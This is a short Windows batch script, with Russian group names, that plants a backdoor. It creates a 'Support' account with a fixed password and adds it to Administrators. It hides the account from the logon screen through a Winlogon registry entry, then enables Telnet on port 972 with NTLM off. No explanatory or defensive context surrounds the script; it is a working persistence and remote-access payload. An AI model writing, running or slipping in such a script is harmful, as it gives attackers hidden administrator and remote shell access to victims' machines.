@shift
@echo off

chcp 1251
net user SUPPORT_388945a0 /delete
net user Support Ghack /add
net localgroup Администраторы support /add
net localgroup Пользователи SUPPORT_388945a0 /del
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v "support" /t reg_dword /d 0 y
sc config tlntsvr start= auto
tlntadmn config port=972 sec=-NTLM
net start Telnet

echo on
